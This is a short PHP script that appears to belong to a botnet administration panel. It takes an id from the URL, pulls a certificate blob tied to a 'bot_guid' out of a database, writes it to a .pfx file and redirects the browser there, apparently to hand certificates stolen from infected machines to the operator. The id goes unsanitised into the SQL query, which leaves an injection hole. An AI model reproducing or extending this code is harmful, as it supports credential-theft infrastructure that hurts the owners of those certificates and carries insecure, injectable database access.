<?php

$id = $_GET['id'];
if (!$id)
	exit;

require_once 'mod_dbase.php';
require_once 'mod_file.php';
	
$dbase = db_open();

$sql = "SELECT data, bot_guid, name, date_rep FROM cert WHERE id = $id LIMIT 1";
$res = mysqli_query($dbase, $sql);
if ((!(@($res))) || !mysqli_num_rows($res)) {
	exit;
}
list($data, $bot_guid, $name, $date_rep) = mysqli_fetch_row($res);

db_close($dbase);

$filepath = "$bot_guid!$date_rep!$name";

for ($i=0; $i<strlen($filepath); $i++) {
	$c = strtolower($filepath{$i});
	$c = $c{0};
	if ( !($c >= 'a' && $c <= 'z') ) {
		$filepath{$i} = 'x';
	}
}

$filepath = 'tmp/' . $filepath . '.pfx';
header("Location: $filepath");
$f = fopen($filepath, "w");
$res = fwrite($f, $data);
fclose($f);

?>